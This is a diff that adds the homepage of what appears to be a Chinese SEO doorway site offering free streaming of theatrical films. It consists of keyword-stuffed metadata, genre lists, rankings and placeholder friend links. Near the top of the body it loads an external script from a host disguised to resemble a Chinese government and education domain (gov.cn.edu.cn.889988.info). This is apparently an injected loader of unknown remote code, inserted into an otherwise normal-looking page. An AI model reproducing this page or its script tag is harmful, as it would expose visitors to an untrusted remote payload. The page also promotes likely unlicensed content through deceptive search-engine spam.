@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>神马我不卡电影网 - 高清在线免费看片首选，海量院线大片、热播剧集每日更新</title>
+<meta name="description" content="神马我不卡电影网（shenmawobukadianyingwang-zh.github.io）专注为影迷提供免费高清在线观影服务，覆盖动作、喜剧、爱情、科幻、悬疑、恐怖、动漫、纪录片等全类型影片，院线同步、资源每日更新、播放流畅不卡顿，无需注册即可随时观看，是追剧看片爱好者的聚集地。">
+<meta name="keywords" content="神马我不卡电影网, shenmawobukadianyingwang-zh.github.io, 免费高清电影在线观看, 最新电影资源, 热播电视剧, 院线大片同步, 动作喜剧科幻悬疑, 不卡顿流畅播放, 每日更新片库, 在线追剧平台">
+<meta name="author" content="神马我不卡电影网">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="canonical" href="https://shenmawobukadianyingwang-zh.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0a0c10;
+  --bg2:#12151c;
+  --card:#161a22;
+  --line:#262c38;
+  --txt:#e8ecf2;
+  --sub:#9aa4b2;
+  --accent:#ff3d5a;
+  --accent2:#ffb13d;
+  --ok:#38d39f;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);
+  color:var(--txt);
+  line-height:1.7;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+
+/* 顶部导航 */
+.nav{
+  position:sticky;top:0;z-index:99;
+  background:rgba(10,12,16,.92);
+  backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.nav-in{
+  max-width:1200px;margin:0 auto;padding:12px 16px;
+  display:flex;align-items:center;gap:18px;
+}
+.logo{
+  font-size:19px;font-weight:800;letter-spacing:.5px;flex-shrink:0;
+  background:linear-gradient(90deg,var(--accent),var(--accent2));
+  -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
+}
+.logo span{font-size:12px;font-weight:500;color:var(--sub);display:block;letter-spacing:0;-webkit-text-fill-color:var(--sub)}
+.nav-links{display:flex;gap:4px;margin-left:auto;flex-wrap:wrap}
+.nav-links a{
+  font-size:14px;padding:6px 10px;border-radius:6px;color:var(--sub);
+  transition:.2s;
+}
+.nav-links a:hover{color:var(--txt);background:var(--card)}
+
+/* 首屏 Hero */
+.hero{
+  position:relative;
+  padding:60px 16px 50px;
+  background:
+    radial-gradient(1200px 500px at 80% -10%,rgba(255,61,90,.18),transparent 60%),
+    radial-gradient(900px 500px at 0% 20%,rgba(56,211,159,.10),transparent 55%),
+    var(--bg2);
+  overflow:hidden;
+}
+.hero-in{max-width:1200px;margin:0 auto;position:relative;z-index:2}
+.tagline{
+  display:inline-block;font-size:12px;letter-spacing:2px;color:var(--accent2);
+  border:1px solid rgba(255,177,61,.35);border-radius:40px;padding:4px 14px;margin-bottom:18px;
+}
+.hero h1{
+  font-size:clamp(28px,5vw,46px);font-weight:900;line-height:1.25;margin-bottom:16px;
+}
+.hero h1 em{font-style:normal;color:var(--accent)}
+.hero p{color:var(--sub);max-width:640px;font-size:15px;margin-bottom:26px}
+.hero-acts{display:flex;gap:12px;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:6px;
+  padding:12px 24px;border-radius:8px;font-size:15px;font-weight:600;
+  border:1px solid transparent;transition:.2s;cursor:pointer;
+}
+.btn-main{background:var(--accent);color:#fff}
+.btn-main:hover{background:#e62e4a;transform:translateY(-2px)}
+.btn-ghost{background:transparent;border-color:var(--line);color:var(--txt)}
+.btn-ghost:hover{border-color:var(--accent2);color:var(--accent2)}
+.stats{
+  margin-top:40px;display:grid;grid-template-columns:repeat(4,1fr);gap:1px;
+  background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;max-width:760px;
+}
+.stat{background:var(--bg2);padding:16px 10px;text-align:center}
+.stat b{display:block;font-size:24px;color:var(--accent2)}
+.stat small{color:var(--sub);font-size:12px}
+
+/* 通用区块 */
+section{padding:50px 16px}
+.wrap{max-width:1200px;margin:0 auto}
+.sec-head{display:flex;align-items:flex-end;gap:14px;margin-bottom:26px;flex-wrap:wrap}
+.sec-head h2{font-size:24px;font-weight:800;position:relative;padding-left:14px}
+.sec-head h2::before{
+  content:"";position:absolute;left:0;top:4px;bottom:4px;width:4px;border-radius:2px;
+  background:linear-gradient(var(--accent),var(--accent2));
+}
+.sec-head .more{margin-left:auto;font-size:13px;color:var(--sub);border:1px solid var(--line);padding:4px 12px;border-radius:20px}
+.sec-head .more:hover{color:var(--accent);border-color:var(--accent)}
+
+/* 影片卡片 */
+.grid{
+  display:grid;gap:18px;
+  grid-template-columns:repeat(auto-fill,minmax(170px,1fr));
+}
+.card{background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden;transition:.25s}
+.card:hover{transform:translateY(-5px);border-color:var(--accent)}
+.thumb{position:relative;aspect-ratio:3/4;overflow:hidden}
+.thumb .ph{
+  position:absolute;inset:0;
+  display:flex;align-items:center;justify-content:center;
+  font-size:34px;font-weight:900;color:rgba(255,255,255,.18);
+}
+.thumb .badge{
+  position:absolute;top:8px;left:8px;font-size:11px;background:rgba(0,0,0,.65);
+  padding:2px 8px;border-radius:4px;backdrop-filter:blur(4px);
+}
+.thumb .score{
+  position:absolute;top:8px;right:8px;font-size:12px;font-weight:700;color:#fff;
+  background:var(--accent);padding:2px 8px;border-radius:4px;
+}
+.thumb .cat{position:absolute;bottom:8px;left:8px;font-size:11px;color:#fff;background:rgba(0,0,0,.6);padding:2px 8px;border-radius:4px}
+.card-body{padding:11px 12px}
+.card-body h3{font-size:14px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.card-body .meta{font-size:12px;color:var(--sub);margin-top:4px;display:flex;justify-content:space-between}
+
+/* 分类 */
+.cats{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:14px}
+.cat{
+  background:var(--card);border:1px solid var(--line);border-radius:12px;padding:20px 16px;
+  display:flex;align-items:center;gap:14px;transition:.2s;
+}
+.cat:hover{border-color:var(--accent2);background:var(--bg2)}
+.cat .ico{font-size:26px;width:46px;height:46px;flex-shrink:0;border-radius:10px;
+  display:flex;align-items:center;justify-content:center;
+  background:linear-gradient(135deg,rgba(255,61,90,.15),rgba(255,177,61,.12))}
+.cat b{font-size:15px;display:block}
+.cat small{color:var(--sub);font-size:12px}
+
+/* 榜单 */
+.rank-wrap{display:grid;grid-template-columns:1.1fr 1fr;gap:24px}
+.rank{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:8px}
+.rank-row{
+  display:grid;grid-template-columns:38px 56px 1fr auto;align-items:center;gap:12px;
+  padding:11px 12px;border-radius:8px;
+}
+.rank-row+.rank-row{border-top:1px dashed var(--line)}
+.rank-row:hover{background:var(--bg2)}
+.rank-no{font-size:20px;font-weight:900;color:var(--line);text-align:center}
+.rank-row.top .rank-no{color:var(--accent)}
+.rank-row.top3 .rank-no{color:var(--accent2)}
+.rank-poster{width:56px;height:78px;border-radius:6px;position:relative;overflow:hidden}
+.rank-poster .ph{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:800;color:rgba(255,255,255,.25)}
+.rank-info h4{font-size:14px;font-weight:600}
+.rank-info span{font-size:12px;color:var(--sub)}
+.rank-up{font-size:12px;color:var(--ok)}
+
+.side-tags{display:flex;flex-wrap:wrap;gap:8px}
+.side-tags a{font-size:13px;padding:6px 13px;border-radius:20px;border:1px solid var(--line);color:var(--sub)}
+.side-tags a:hover{color:var(--accent);border-color:var(--accent)}
+
+/* 时间线 */
+.tl{position:relative;padding-left:8px}
+.tl-item{
+  display:grid;grid-template-columns:88px 1fr;gap:16px;
+  padding:14px 0;border-bottom:1px solid var(--line);
+}
+.tl-item:last-child{border-bottom:none}
+.tl-time{font-size:12px;color:var(--accent2);font-weight:600;padding-top:2px}
+.tl-body h4{font-size:15px;font-weight:600;margin-bottom:3px}
+.tl-body p{font-size:13px;color:var(--sub)}
+
+/* 关于 */
+.about{background:var(--bg2)}
+.about-grid{display:grid;grid-template-columns:1.2fr 1fr;gap:34px;align-items:start}
+.about p{color:var(--sub);font-size:15px;margin-bottom:14px}
+.feat{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.feat div{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:16px}
+.feat b{display:block;font-size:15px;margin-bottom:5px}
+.feat small{color:var(--sub);font-size:13px}
+
+/* 友链 */
+.links{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px}
+.link{
+  border:1px solid var(--line);border-radius:10px;padding:14px 16px;transition:.2s;
+  background:var(--card);display:block;
+}
+.link:hover{border-color:var(--ok);transform:translateY(-3px)}
+.link b{font-size:14px;display:block}
+.link span{font-size:12px;color:var(--sub);word-break:break-all}
+
+/* 页脚 */
+footer{border-top:1px solid var(--line);padding:34px 16px 40px;background:var(--bg2)}
+.foot-in{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1.5fr 1fr 1fr;gap:30px}
+.foot-in h5{font-size:14px;margin-bottom:12px;color:var(--txt)}
+.foot-in ul{list-style:none}
+.foot-in li{margin-bottom:8px}
+.foot-in a{font-size:13px;color:var(--sub)}
+.foot-in a:hover{color:var(--accent)}
+.copy{max-width:1200px;margin:24px auto 0;padding-top:18px;border-top:1px solid var(--line);font-size:12px;color:var(--sub);text-align:center}
+
+/* 响应式 */
+@media(max-width:900px){
+  .rank-wrap,.about-grid{grid-template-columns:1fr}
+  .foot-in{grid-template-columns:1fr 1fr}
+}
+@media(max-width:640px){
+  .nav-in{padding:10px 12px}
+  .nav-links{gap:0;width:100%;order:3;margin-left:0;overflow-x:auto}
+  .nav-links a{font-size:13px;padding:6px 9px;white-space:nowrap}
+  .logo{font-size:16px}
+  section{padding:38px 14px}
+  .hero{padding:40px 14px 36px}
+  .stats{grid-template-columns:1fr 1fr}
+  .grid{grid-template-columns:repeat(2,1fr);gap:12px}
+  .cats,.feat{grid-template-columns:1fr 1fr}
+  .rank-row{grid-template-columns:30px 44px 1fr;gap:9px}
+  .rank-poster{width:44px;height:62px}
+  .rank-up{display:none}
+  .foot-in{grid-template-columns:1fr}
+  .sec-head h2{font-size:20px}
+}
+@media(max-width:380px){
+  .grid{grid-template-columns:1fr 1fr}
+  .cats,.feat{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="nav">
+  <div class="nav-in">
+    <div class="logo">神马我不卡电影网<span>shenmawobukadianyingwang-zh.github.io</span></div>
+    <nav class="nav-links">
+      <a href="#home">首页</a>
+      <a href="#genre">电影分类</a>
+      <a href="#rank">热门榜单</a>
+      <a href="#update">最新上线</a>
+      <a href="#about">关于本站</a>
+      <a href="#friend">友情链接</a>
+    </nav>
+  </div>
+</header>
+
+<!-- 首页推荐 -->
+<section class="hero" id="home">
+  <div class="hero-in">
+    <span class="tagline">FREE · HD · DAILY UPDATE</span>
+    <h1>想看的片子这里都有<br>神马我不卡电影网<em>·</em>想看就看</h1>
+    <p>动作、喜剧、爱情、科幻、悬疑、恐怖、动漫、纪录片……全类型影片一站覆盖。院线大片同步更新，高清资源即点即播，流畅不卡顿，每天都有新片入库，追剧看片不再东奔西跑。</p>
+    <div class="hero-acts">
+      <a class="btn btn-main" href="#genre">马上挑片 ▸</a>
+      <a class="btn btn-ghost" href="#rank">查看今日榜单</a>
+    </div>
+    <div class="stats">
+      <div class="stat"><b>12000+</b><small>在库影片</small></div>
+      <div class="stat"><b>50+</b><small>影片分类</small></div>
+      <div class="stat"><b>每日</b><small>新片更新</small></div>
+      <div class="stat"><b>1080P</b><small>高清画质</small></div>
+    </div>
+  </div>
+</section>
+
+<!-- 电影分类 -->
+<section id="genre">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>电影分类</h2>
+      <a class="more" href="#">全部 50+ 类型 ›</a>
+    </div>
+    <div class="cats">
+      <a class="cat" href="#"><span class="ico">💥</span><div><b>动作片</b><small>热血打斗 · 2632部</small></div></a>
+      <a class="cat" href="#"><span class="ico">😂</span><div><b>喜剧片</b><small>轻松解压 · 1987部</small></div></a>
+      <a class="cat" href="#"><span class="ico">💕</span><div><b>爱情片</b><small>甜虐交加 · 1540部</small></div></a>
+      <a class="cat" href="#"><span class="ico">🚀</span><div><b>科幻片</b><small>脑洞大开 · 876部</small></div></a>
+      <a class="cat" href="#"><span class="ico">🕵️</span><div><b>悬疑片</b><small>烧脑反转 · 1102部</small></div></a>
+      <a class="cat" href="#"><span class="ico">👻</span><div><b>恐怖片</b><small>惊悚刺激 · 634部</small></div></a>
+      <a class="cat" href="#"><span class="ico">🎭</span><div><b>剧情片</b><small>获奖佳作 · 2405部</small></div></a>
+      <a class="cat" href="#"><span class="ico">🎨</span><div><b>动漫</b><small>国漫日漫 · 988部</small></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- 热门榜单 -->
+<section id="rank" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>热门榜单</h2>
+      <a class="more" href="#">完整百强榜 ›</a>
+    </div>
+    <div class="rank-wrap">
+      <div class="rank">
+        <div class="rank-row top"><div class="rank-no">1</div><div class="rank-poster"><div class="ph">沉默</div></div><div class="rank-info"><h4>沉默的真相</h4><span>悬疑 · 2020 · 24集</span></div><span class="rank-up">↑ 2</span></div>
+        <div class="rank-row top3"><div class="rank-no">2</div><div class="rank-poster"><div class="ph">流浪</div></div><div class="rank-info"><h4>流浪地球Ⅱ</h4><span>科幻 · 2023 · 片长173分钟</span></div><span class="rank-up">↑ 1</span></div>
+        <div class="rank-row top3"><div class="rank-no">3</div><div class="rank-poster"><div class="ph">孤注</div></div><div class="rank-info"><h4>孤注一掷</h4><span>犯罪 · 2023 · 片长130分钟</span></div><span class="rank-up">↑ 4</span></div>
+        <div class="rank-row"><div class="rank-no">4</div><div class="rank-poster"><div class="ph">八角</div></div><div class="rank-info"><h4>八角笼中</h4><span>剧情 · 2023 · 片长117分钟</span></div><span class="rank-up">↑ 6</span></div>
+        <div class="rank-row"><div class="rank-no">5</div><div class="rank-poster"><div class="ph">封神</div></div><div class="rank-info"><h4>封神第一部</h4><span>奇幻 · 2023 · 片长148分钟</span></div><span class="rank-up">↑ 3</span></div>
+        <div class="rank-row"><div class="rank-no">6</div><div class="rank-poster"><div class="ph">消失</div></div><div class="rank-info"><h4>消失的她</h4><span>悬疑 · 2023 · 片长121分钟</span></div><span class="rank-up">↓ 1</span></div>
+        <div class="rank-row"><div class="rank-no">7</div><div class="rank-poster"><div class="ph">满江</div></div><div class="rank-info"><h4>满江红</h4><span>喜剧 · 2023 · 片长159分钟</span></div><span class="rank-up">↑ 5</span></div>
+        <div class="rank-row"><div class="rank-no">8</div><div class="rank-poster"><div class="ph">深海</div></div><div class="rank-info"><h4>深海</h4><span>动画 · 2023 · 片长112分钟</span></div><span class="rank-up">↑ 2</span></div>
+      </div>
+      <div>
+        <div class="sec-head" style="margin-bottom:16px"><h2 style="font-size:19px">热门搜索词</h2></div>
+        <div class="side-tags">
+          <a href="#">高清免费电影</a><a href="#">最新院线大片</a><a href="#">热播国产剧</a><a href="#">悬疑烧脑片单</a><a href="#">2026新片</a><a href="#">经典港片</a><a href="#">欧美科幻巨制</a><a href="#">日韩高分剧</a><a href="#">动画电影推荐</a><a href="#">喜剧合家欢</a><a href="#">恐怖惊悚</a><a href="#">纪录片精选</a>
+        </div>
+        <div class="sec-head" style="margin:26px 0 16px"><h2 style="font-size:19px">观影优势</h2></div>
+        <div class="feat">
+          <div><b>🌐 全球片源</b><small>内地港台、日韩欧美全覆盖</small></div>
+          <div><b>⚡ 极速加载</b><small>多线路秒开，告别缓冲转圈</small></div>
+          <div><b>📱 多端适配</b><small>手机平板电脑都能看</small></div>
+          <div><b>🔔 更新提醒</b><small>追剧更新第一时间通知</small></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 最新上线 -->
+<section id="update">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>最新上线</h2>
+      <a class="more" href="#">更新记录 ›</a>
+    </div>
+    <div class="grid">
+      <a class="card" href="#"><div class="thumb"><div class="ph">沙丘</div><span class="badge">今日更新</span><span class="score">9.1</span><span class="cat">科幻</span></div><div class="card-body"><h3>沙丘觉醒</h3><div class="meta"><span>2026 · 美国</span><span>HD</span></div></div></a>
+      <a class="card" href="#"><div class="thumb"><div class="ph">误杀</div><span class="badge">热播</span><span class="score">8.6</span><span class="cat">悬疑</span></div><div class="card-body"><h3>误杀3</h3><div class="meta"><span>2026 · 国产</span><span>HD</span></div></div></a>
+      <a class="card" href="#"><div class="thumb"><div class="ph">疯狂</div><span class="badge">今日更新</span><span class="score">8.9</span><span class="cat">喜剧</span></div><div class="card-body"><h3>疯狂的外星人2</h3><div class="meta"><span>2026 · 国产</span><span>HD</span></div></div></a>
+      <a class="card" href="#"><div class="thumb"><div class="ph">深海</div><span class="badge">独家</span><span class="score">9.3</span><span class="cat">动画</span></div><div class="card-body"><h3>深海之下</h3><div class="meta"><span>2026 · 国产</span><span>4K</span></div></div></a>
+      <a class="card" href="#"><div class="thumb"><div class="ph">边境</div><span class="badge">今日更新</span><span class="score">8.4</span><span class="cat">动作</span></div><div class="card-body"><h3>边境猎人</h3><div class="meta"><span>2026 · 合拍</span><span>HD</span></div></div></a>
+      <a class="card" href="#"><div class="thumb"><div class="ph">无声</div><span class="badge">热播</span><span class="score">8.7</span><span class="cat">剧情</span></div><div class="card-body"><h3>无声的证言</h3><div class="meta"><span>2026 · 国产</span><span>HD</span></div></div></a>
+      <a class="card" href="#"><div class="thumb"><div class="ph">银河</div><span class="badge">今日更新</span><span class="score">9.0</span><span class="cat">科幻</span></div><div class="card-body"><h3>银河回响</h3><div class="meta"><span>2026 · 美国</span><span>4K</span></div></div></a>
+      <a class="card" href="#"><div class="thumb"><div class="ph">烟火</div><span class="badge">独家</span><span class="score">8.5</span><span class="cat">爱情</span></div><div class="card-body"><h3>烟火下的约定</h3><div class="meta"><span>2026 · 国产</span><span>HD</span></div></div></a>
+    </div>
+
+    <div class="tl" style="margin-top:38px">
+      <div class="sec-head" style="margin-bottom:16px"><h2 style="font-size:19px">近期更新记录</h2></div>
+      <div class="tl-item"><div class="tl-time">今天 09:20</div><div class="tl-body"><h4>新增 36 部影片上线</h4><p>涵盖科幻、悬疑、喜剧三大类型，其中 4K 资源 9 部</p></div></div>
+      <div class="tl-item"><div class="tl-time">昨天 21:05</div><div class="tl-body"><h4>院线同步：《沙丘觉醒》高清版入库</h4><p>上线首周播放量突破 80 万次，位列热度榜首</p></div></div>
+      <div class="tl-item"><div class="tl-time">10月05日</div><div class="tl-body"><h4>片库突破 12000 部里程碑</h4><p>新增纪录片精选专题，收录 BBC、NHK 经典系列 120+ 部</p></div></div>
+      <div class="tl-item"><div class="tl-time">10月03日</div><div class="tl-body"><h4>播放线路扩容升级</h4><p>新增 3 条 CDN 加速线路，移动端首屏加载提速 40%</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于本站 -->
+<section id="about" class="about">
+  <div class="wrap">
+    <div class="sec-head"><h2>关于神马我不卡电影网</h2></div>
+    <div class="about-grid">
+      <div>
+        <p>神马我不卡电影网（<strong style="color:var(--accent2)">shenmawobukadianyingwang-zh.github.io</strong>）是一个面向影迷的免费在线观影导航站，致力于把分散在各处的优质影视资源汇总整理，让每一次「想看片」都能快速找到、顺畅看完。</p>
+        <p>从院线新片到经典老片，从国产剧集到海外佳作，我们按类型、地区、年代、评分做了精细分类，并配合每日更新机制与热门榜单，帮你在海量片库里少走弯路，把时间留给真正值得看的片子。</p>
+        <p>本站全程无需注册登录，打开即看，自动适配手机、平板、电脑等不同屏幕尺寸，通勤路上、睡前时光、周末宅家都能随时开刷。</p>
+      </div>
+      <div class="feat">
+        <div><b>🎯 定位清晰</b><small>专注影视资源导航整理</small></div>
+        <div><b>🔄 更新稳定</b><small>每日人工筛选新增内容</small></div>
+        <div><b>🛡️ 纯净体验</b><small>拒绝繁琐跳转与干扰</small></div>
+        <div><b>🤝 开放合作</b><small>欢迎同类站点互换友链</small></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 友情链接 -->
+<section id="friend">
+  <div class="wrap">
+    <div class="sec-head"><h2>友情链接</h2><a class="more" href="#">申请互换 ›</a></div>
+    <div class="links">
+      <a class="link" href="#"><b>神马我不卡电影网</b><span>shenmawobukadianyingwang-zh.github.io</span></a>
+      <a class="link" href="#"><b>高清影视导航</b><span>film-nav.example.com</span></a>
+      <a class="link" href="#"><b>院线新片速递</b><span>newfilm.example.com</span></a>
+      <a class="link" href="#"><b>经典老片馆</b><span>oldmovie.example.com</span></a>
+      <a class="link" href="#"><b>动漫资源合集</b><span>animehub.example.com</span></a>
+      <a class="link" href="#"><b>纪录片精选</b><span>docucenter.example.com</span></a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="foot-in">
+    <div>
+      <h5>神马我不卡电影网</h5>
+      <p style="font-size:13px;color:var(--sub);max-width:320px">专注免费高清在线观影，院线同步、每日更新、流畅不卡顿。shenmawobukadianyingwang-zh.github.io 是你随时随地的追剧看片入口。</p>
+    </div>
+    <div>
+      <h5>快捷导航</h5>
+      <ul>
+        <li><a href="#home">首页推荐</a></li>
+        <li><a href="#genre">电影分类</a></li>
+        <li><a href="#rank">热门榜单</a></li>
+        <li><a href="#update">最新上线</a></li>
+        <li><a href="#about">关于本站</a></li>
+      </ul>
+    </div>
+    <div>
+      <h5>联系与合作</h5>
+      <ul>
+        <li><a href="#">商务合作</a></li>
+        <li><a href="#">友链申请</a></li>
+        <li><a href="#">内容反馈</a></li>
+        <li><a href="#">使用须知</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="copy">© 2026 神马我不卡电影网 shenmawobukadianyingwang-zh.github.io 保留所有权利 · 本站内容仅供影视信息导航参考</div>
+</footer>
+
+</body>
+</html>
